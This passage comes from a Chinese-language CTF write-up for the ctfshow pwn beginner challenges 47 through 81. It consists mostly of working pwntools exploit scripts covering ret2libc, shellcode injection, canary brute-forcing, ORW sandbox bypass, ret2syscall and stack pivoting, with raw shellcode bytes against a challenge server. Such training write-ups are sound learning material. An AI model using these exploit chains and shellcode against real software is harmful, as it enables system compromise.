plaintext">from pwn import*<br>from LibcSearcher import*<br>elf=ELF(&#x27;./pwn47&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28235)<br><br>io.recvuntil(&#x27;puts: &#x27;)<br>puts=eval(io.recvuntil(&#x27;\n&#x27;,drop=True))<br>print(hex(puts))<br>libc=LibcSearcher(&#x27;puts&#x27;,puts)<br>libc_base=puts-libc.dump(&#x27;puts&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br><br>io.recvuntil(&#x27;gift: &#x27;)<br>bin_sh=eval(io.recvuntil(&#x27;\n&#x27;,drop=True))<br><br>payload=cyclic(0x9c+4)+p32(system)+p32(0)+p32(bin_sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn48"><a href="#pwn48" class="headerlink" title="pwn48"></a>pwn48</h2><p>简单的32位ret2libc，这次使用的是puts泄漏libc基址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>elf=ELF(&#x27;./pwn48&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28277)<br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br><br>payload1=cyclic(0x6b+4)+p32(puts_plt)+p32(main)+p32(puts_got)<br>io.sendline(payload1)<br>puts=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])<br>print(hex(puts))<br><br>libc=LibcSearcher(&#x27;puts&#x27;,puts)<br>libc_base=puts-libc.dump(&#x27;puts&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br>bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>payload2=cyclic(0x6b+4)+p32(system)+p32(main)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn49"><a href="#pwn49" class="headerlink" title="pwn49"></a>pwn49</h2><p>一道静态编译的32位题目，使用mprotect函数可以将内存权限修改为可读可写可执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn49&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28243)<br><br>mprotect=elf.sym[&#x27;mprotect&#x27;]<br>read=elf.sym[&#x27;read&#x27;]<br><br>register=0x080a019b<br>m_start=0x080DA000<br>m_size=0x1000<br>m_proc=7<br><br>payload=cyclic(0x12+4)+p32(mprotect)+p32(0x080a019b)+p32(m_start)+p32(m_size)+p32(m_proc)<br>payload+=p32(read)+p32(0x080a019b)+p32(0)+p32(m_start)+p32(m_size)<br>payload+=p32(m_start)<br><br>io.sendline(payload)<br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><p>当然可以打ret2libc。</p><h2 id="pwn50"><a href="#pwn50" class="headerlink" title="pwn50"></a>pwn50</h2><p>64位ret2libc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>libc=ELF(&#x27;./pwn50_libc.so&#x27;)<br>elf=ELF(&#x27;./pwn50&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28257)<br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br>rdi=0x04007e3<br>rsi_r15=0x04007e1<br>ret=0x04004fe<br><br>payload1=cyclic(0x20+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendlineafter(&#x27;Hello CTFshow&#x27;,payload1)<br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh&#x27;))<br><br>payload2=cyclic(0x20+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>mprotect</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>context.arch=&#x27;amd64&#x27;<br>libc=ELF(&#x27;./pwn50_libc.so&#x27;)<br>elf=ELF(&#x27;./pwn50&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28257)<br>#io=process(&#x27;./pwn50&#x27;)<br><br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br>rdi=0x04007e3<br>ret=0x04004fe<br><br>payload1=cyclic(0x20+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendlineafter(&#x27;Hello CTFshow&#x27;,payload1)<br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>mprotect=libc_base+libc.sym[&#x27;mprotect&#x27;]<br>gets=libc_base+libc.sym[&#x27;gets&#x27;]<br>rsi=libc_base+0x023a6a<br>rdx=libc_base+0x01b96<br><br>m_start=0x601000<br>m_size=0x1000<br>m_proc=7<br><br>payload2=cyclic(0x20+8)+p64(rdi)+p64(m_start)+p64(rsi)+p64(m_size)+p64(rdx)+p64(m_proc)+p64(mprotect)+p64(main)<br>io.sendline(payload2)<br><br>payload3=cyclic(0x20+8)+p64(rdi)+p64(m_start)+p64(gets)+p64(main)<br>io.sendline(payload3)<br>io.sendline(asm(shellcraft.sh()))<br><br>payload4=cyclic(0x20+8)+p64(m_start)<br>io.sendline(payload4)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn51"><a href="#pwn51" class="headerlink" title="pwn51"></a>pwn51</h2><p>一道简单的32位题目，该题可以实现将I转换成IronMan，因此可以根据这个造成栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28265)<br><br>cat_flag=0x0804902E<br><br>payload=b&#x27;I&#x27;*16+p32(cat_flag)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn52"><a href="#pwn52" class="headerlink" title="pwn52"></a>pwn52</h2><p>简单的32位题目，只需要在调用函数时加上参数即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28170)<br><br>flag=0x08048586<br>payload=cyclic(0x6C+4)+p32(flag)+p32(0)+p32(0x36c)+p32(0x36d)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn53"><a href="#pwn53" class="headerlink" title="pwn53"></a>pwn53</h2><p>这是一道需要爆破canary的题目，与平时的canary不同的是此题是模拟了一个静态的canary，并不是常规意义上的canary。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>canary=b&#x27;&#x27;<br> <br>for i in range(4):<br>    for CanaryBit in range(0xFF):<br>        io = remote(&quot;pwn.challenge.ctf.show&quot;,28235)<br>        payload = b&#x27;a&#x27;*(0x20) + canary + p8(CanaryBit)<br> <br>        io.sendlineafter(b&#x27;&gt;&#x27;,b&quot;99999&quot;)<br>        io.sendafter(b&#x27;$ &#x27;,payload)<br> <br>        response = io.recvline()<br>        io.close()<br>        if b&#x27;Canary Value Incorrect!&#x27; in response:<br>            print(f&#x27;Canary = &#123;canary&#125; | &#123;p8(CanaryBit)&#125; is Wrong&#x27;)<br>        else:<br>            print(f&#x27;Canary = &#123;canary&#125; | &#123;p8(CanaryBit)&#125; is Right&#x27;)<br>            canary += p8(CanaryBit)<br>            break<br> <br>print(f&#x27;Compelete! Canary = &#123;canary&#125;&#x27;)<br> <br>io = remote(&quot;pwn.challenge.ctf.show&quot;,28235)<br> <br>binsh_add = 0x08048696<br>payload = b&#x27;a&#x27;*(0x20) + canary + b&#x27;a&#x27;*(0x10) + p32(binsh_add)<br> <br>io.sendlineafter(b&#x27;&gt;&#x27;,b&quot;99999&quot;)<br>io.sendafter(b&#x27;$ &#x27;,payload)<br> <br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn54"><a href="#pwn54" class="headerlink" title="pwn54"></a>pwn54</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn54.png"></p><p>一道模拟用户登录题目，输入用户名，再打印出用户名，再输入密码进行对比，一致就获得flag。这题难点在于如何泄漏密码，由于puts函数会一直输出直到换行符或空白时才停止的特性，那么可以通过这个来泄漏密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28296)<br><br>payload=cyclic(0x100)<br>io.sendlineafter(&#x27;Input your Username:&#x27;,payload)<br>io.sendline(payload)<br>io.recvuntil(b&#x27;,&#x27;)<br>password=io.recv(33)<br>print(password)<br>io.close()<br><br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28296)<br>io.sendline(b&#x27;haoo&#x27;)<br>io.sendline(password)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn55"><a href="#pwn55" class="headerlink" title="pwn55"></a>pwn55</h2><p>一道简单的32位栈溢出题目，通过调用不同函数并设置相应的参数，从而满足最后获得flag的条件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn55&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28263)<br><br>flag=0x08048606<br>flag1=0x08048586<br>flag2=0x0804859D<br>ctfshow=elf.sym[&#x27;ctfshow&#x27;]<br><br>payload1=cyclic(0x2c+4)+p32(flag1)+p32(ctfshow)<br>io.sendline(payload1)<br>payload2=cyclic(0x2c+4)+p32(flag2)+p32(ctfshow)+p32(0xACACACAC)<br>io.sendline(payload2)<br>payload3=cyclic(0x2c+4)+p32(flag)+p32(ctfshow)+p32(0xBDBDBDBD)<br>io.sendline(payload3)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn56"><a href="#pwn56" class="headerlink" title="pwn56"></a>pwn56</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn56.png"></p><p>简单介绍了32位的ret2shellcode，首先是将字符串&#x2F;bin&#x2F;sh入栈再将栈顶地址赋值给ebx寄存器，将ecx与edx寄存器的值设为0，最后将eax的值设为0xb，并使用int 0x80。从而实现execve(‘&#x2F;bin&#x2F;sh’,0,0)，获得shell。</p><h2 id="pwn57"><a href="#pwn57" class="headerlink" title="pwn57"></a>pwn57</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn57.png"></p><p>简单的介绍了64位的ret2shellcode，先将rax寄存器入栈，再将rdx和rsi寄存器的值设为0，将&#x2F;bin&#x2F;&#x2F;sh字符串放到rbx寄存器中并将该寄存器入栈，最后将&#x2F;bin&#x2F;&#x2F;sh弹出到rdi寄存器中并将rax的值设为0x3B，使用syscall触发系统调用。</p><h2 id="pwn58"><a href="#pwn58" class="headerlink" title="pwn58"></a>pwn58</h2><p>简单的32位ret2shellcode，使用shellcraft模块直接构造shellcode即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28202)<br><br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn59"><a href="#pwn59" class="headerlink" title="pwn59"></a>pwn59</h2><p>简单的64位ret2shellcode，只需要设置一下架构即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28174)<br><br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn60"><a href="#pwn60" class="headerlink" title="pwn60"></a>pwn60</h2><p>简单的32位ret2shellcode。通过栈溢出返回到执行shellcode的地方即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28189)<br>bss=0x0804A080<br>shellcode=asm(shellcraft.sh())<br><br>payload=shellcode.ljust(112,b&#x27;a&#x27;)+p32(bss)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn61"><a href="#pwn61" class="headerlink" title="pwn61"></a>pwn61</h2><p>简单的64位ret2shellcode，主要在于接收地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28121)<br><br>shellcode=asm(shellcraft.sh())<br>io.recvuntil(b&#x27;[&#x27;)<br>v5=io.recvuntil(b&#x27;]&#x27;,drop=True)<br>v5=int(v5,16)<br>print(v5)<br><br>payload=cyclic(0x10+8)+p64(v5+32)+shellcode<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn62"><a href="#pwn62" class="headerlink" title="pwn62"></a>pwn62</h2><p>简单的64位ret2shellcode，主要这次的shellcode输入长度要控制在0x18个字节以内</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28195)<br><br>shellcode=b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;    #24字节shellcode<br>io.recvuntil(b&#x27;[&#x27;)<br>buf=io.recvuntil(b&#x27;]&#x27;,drop=True)<br>buf=int(buf,16)<br>payload=cyclic(0x10+8)+p64(buf+32)+shellcode<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn63"><a href="#pwn63" class="headerlink" title="pwn63"></a>pwn63</h2><p>这次shellcode的长度要控制在0x17个字节以内</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&quot;amd64&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28217)<br><br>shellcode=b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;    #23字节shellcode<br>io.recvuntil(b&quot;[&quot;)<br>buf=io.recvuntil(b&quot;]&quot;,drop=True)<br>buf=int(buf,16)<br>payload=cyclic(0x10+8)+p64(buf+32)+shellcode<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn64.png"></p><p>此题使用了mmap函数分配了一块连续的地址空间，指定了其相应的权限和属性（可读可写可执行），并将起始地址保存到变量buf中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;i386&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28123)<br><br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn65"><a href="#pwn65" class="headerlink" title="pwn65"></a>pwn65</h2><p>这题主要考察可见字符shellcode的编写，使用工具即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28264)<br><br>shellcode=b&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;    #可见字符shellcode<br>io.sendafter(&#x27;Shellcode\n&#x27;,shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn66"><a href="#pwn66" class="headerlink" title="pwn66"></a>pwn66</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28103)<br><br>shellcode=asm(shellcraft.sh())<br>payload=b&#x27;\x00\xc0&#x27;+shellcode<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn67"><a href="#pwn67" class="headerlink" title="pwn67"></a>pwn67</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn67_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn67_2.png"></p><p>此题没有开启NX保护，因此可以打shellcode，关键在于如何找到shellcode的地址，只要找到了地址就可以执行shellcode获得shell。</p><p>可以看出position的值与v1有关。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn67_3.png"></p><p>通过可以画出大致的栈结构图，此时v1距离seed有0x2d，position&#x3D;v3&#x3D;&amp;v1+v2&#x3D;seed-0x2d+v2&#x3D;seed-0x2d+random-668（random为0~1336），因此seed&#x3D;position+0x2d+668-random。我们的nop指令和shellcode是写入到seed中，又因为输入v5的地址要在第一个nop之后在shellcode之前，因此地址可以是seed+random。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28251)<br>shellcode=asm(shellcraft.sh())<br>io.recvuntil(b&#x27;The current location: &#x27;)<br>addr=eval(io.recvuntil(&#x27;\n&#x27;,drop=True))<br>print(hex(addr))<br>payload=b&#x27;\x90&#x27;*1336+shellcode<br>io.sendline(payload)<br><br>sh=addr+0x29c+0x2d<br>io.sendline(hex(sh))<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn68"><a href="#pwn68" class="headerlink" title="pwn68"></a>pwn68</h2><p>64位的nop sled</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28144)<br><br>shellcode=asm(shellcraft.sh())<br>io.recvuntil(b&#x27;The current location: &#x27;)<br>addr=eval(io.recvuntil(&#x27;\n&#x27;,drop=True))<br>payload=b&#x27;\x90&#x27;*1336+shellcode<br>io.sendline(payload)<br><br>sh=addr+668+0x35<br>io.sendline(hex(sh))<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn69"><a href="#pwn69" class="headerlink" title="pwn69"></a>pwn69</h2><p>打orw</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn69_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn69_2.png"></p><p>开启了沙盒保护，且输入长度不够，但没开NX保护，因此可以先调用read函数，在执行orw。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28183)<br><br>jmp_rsp=0x0400A01<br>addr=0x123000<br><br>orw_shellcode=shellcraft.open(&#x27;/ctfshow_flag&#x27;)+shellcraft.read(3,addr,0x100)+shellcraft.write(1,addr,0x100)<br>orw_shellcode=asm(orw_shellcode)<br><br>jump_addr=&#x27;&#x27;&#x27;<br>mov rax,0x123000;<br>jmp rax;<br>&#x27;&#x27;&#x27;<br>jump_buf=&#x27;&#x27;&#x27;<br>sub rsp,0x30;<br>jmp rsp;<br>&#x27;&#x27;&#x27;<br><br>payload=asm(shellcraft.read(0,addr,0x1000))+asm(jump_addr)<br>payload=payload.ljust(0x28,b&#x27;a&#x27;)<br>payload+=p64(jmp_rsp)+asm(jump_buf)<br>io.sendlineafter(b&#x27;do&#x27;,payload)<br>io.sendline(orw_shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn70"><a href="#pwn70" class="headerlink" title="pwn70"></a>pwn70</h2><p>绕过strlen打orw。</p><p>exp1：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28231)<br><br>shellcode=b&#x27;\x00B\x00&#x27;+asm(shellcraft.cat(&#x27;/flag&#x27;))<br>io.sendline(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28231)<br><br>shellcode=&#x27;&#x27;&#x27;<br>push 0;<br>#open<br>mov r15,0x67616c66;    #flag<br>push r15;<br>mov rdi,rsp;<br>mov rsi,0;<br>mov rax,2;<br>syscall;<br>#read<br>mov rdi,3;<br>mov rsi,rsp;<br>mov rdx,0xff;<br>mov rax,0;<br>syscall;<br>#write<br>mov rdi,1;<br>mov rsi,rsp;<br>mov rdx,0xff;<br>mov rax,1;<br>syscall;<br>&#x27;&#x27;&#x27;<br>shellcode=asm(shellcode)<br>io.sendline(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn71"><a href="#pwn71" class="headerlink" title="pwn71"></a>pwn71</h2><p>32位ret2syscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28251)<br><br>bin_sh=0x080BE408<br>eax=0x080bb196<br>edx_ecx_ebx=0x0806eb90<br>int_0x80=0x08049421<br><br>payload=cyclic(112)+p32(eax)+p32(0xB)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn72"><a href="#pwn72" class="headerlink" title="pwn72"></a>pwn72</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)<br><br>int_0x80=0x0806F350<br>bss=0x080eb000<br>eax=0x080bb2c6<br>edx_ecx_ebx=0x0806ecb0<br><br>payload=cyclic(44)+p32(eax)+p32(0x3)+p32(edx_ecx_ebx)+p32(0x10)+p32(bss)+p32(0)+p32(int_0x80)<br>payload+=p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)+p32(int_0x80)<br>io.sendline(payload)<br>io.sendline(b&#x27;/bin/sh\x00&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn73"><a href="#pwn73" class="headerlink" title="pwn73"></a>pwn73</h2><p>一把梭</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ROPgadget --binary pwn73 --ropchain<br></code></pre></td></tr></table></figure><h2 id="pwn74"><a href="#pwn74" class="headerlink" title="pwn74"></a>pwn74</h2><p>这题介绍了one_gadget攻击方式。one_gadget是libc中存在一些执行execve(‘&#x2F;bin&#x2F;sh’,0,0)的片段，当可以泄漏libc地址，并且知道libc版本时可以使用此方法快速控制指令寄存器开启shell。运用于不利构造参数的情况。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>elf=ELF(&#x27;./pwn74&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28253)<br><br>one_gadget=0x10a2fc<br>io.recvuntil(&#x27;this:&#x27;)<br>printf=int(io.recv(14),16)<br>print(printf)<br>libc_base=printf-libc.sym[&#x27;printf&#x27;]<br><br>io.sendline(str(one_gadget+libc_base))<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn75"><a href="#pwn75" class="headerlink" title="pwn75"></a>pwn75</h2><p>打的32位栈迁移，先泄漏ebp地址，算出输入地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn75&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28213)<br><br>leave=0x080484d5<br>system=elf.sym[&#x27;system&#x27;]<br><br>payload=b&#x27;a&#x27;*0x28<br>io.sendafter(&#x27;codename:&#x27;,payload)<br>io.recvuntil(&#x27;a&#x27;*0x28)<br>ebp=u32(io.recv(4).ljust(4,b&#x27;\x00&#x27;))<br>print(hex(ebp))<br><br>buf=ebp-0x38<br>payload=p32(system)+p32(0)+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;<br>payload=payload.ljust(0x28,b&#x27;a&#x27;)<br><br>payload+=p32(buf-4)+p32(leave)<br>io.send(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn76"><a href="#pwn76" class="headerlink" title="pwn76"></a>pwn76</h2><p>本题先对用户输入的字符串进行base64解码再保存解码后的字符串长度（不能超过12）并将其保存到input中，接着可以修改ebp的值至input，将后门函数存到input，获取即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28135)<br><br>shell=0x08049284<br>intput=0x0811EB40<br><br>payload=b&#x27;aaaa&#x27;+p32(shell)+p32(intput)<br>payload=base64.b64encode(payload)    #base64编码<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn77"><a href="#pwn77" class="headerlink" title="pwn77"></a>pwn77</h2><p>另一种形式的64位ret2libc，注意不要覆盖数组索引</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn77&#x27;)<br>libc=ELF(&#x27;./pwn77libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28276)<br><br>rdi=0x04008e3<br>ret=0x0400576<br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br><br>payload=cyclic(0x110-4)+p32(0x10d)+b&#x27;aaaaaaaa&#x27;+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendline(payload)<br><br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br><br>payload=cyclic(0x110-4)+p32(0x10d)+b&#x27;aaaaaaaa&#x27;+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn78"><a href="#pwn78" class="headerlink" title="pwn78"></a>pwn78</h2><p>64位ret2syscall的多系统调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28149)<br><br>bss=0x06C1C60<br>rax=0x046b9f8<br>rdi=0x04016c3<br>rdx_rsi=0x04377f9<br>syscall=0x45bac5<br>payload=cyclic(0x50+8)+p64(rax)+p64(0)+p64(rdi)+p64(0)+p64(rdx_rsi)+p64(0x10)+p64(bss)+p64(syscall)<br>payload+=p64(rax)+p64(0x3b)+p64(rdi)+p64(bss)+p64(rdx_rsi)+p64(0)+p64(0)+p64(syscall)<br><br>io.sendline(payload)<br>io.sendline(b&#x27;/bin/sh\x00&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn79"><a href="#pwn79" class="headerlink" title="pwn79"></a>pwn79</h2><p>打ret2reg</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28259)<br><br>call_eax=0x080484a0<br>shellcode=asm(shellcraft.sh())<br>payload=shellcode.ljust(0x208,b&#x27;a&#x27;)+b&#x27;aaaa&#x27;+p32(call_eax)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn80"><a href="#pwn80" class="headerlink" title="pwn80"></a>pwn80</h2><p>打BROP</p><h2 id="pwn81"><a href="#pwn81" class="headerlink" title="pwn81"></a>pwn81</h2><p>简单的栈溢出，只需注意接收地址即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn 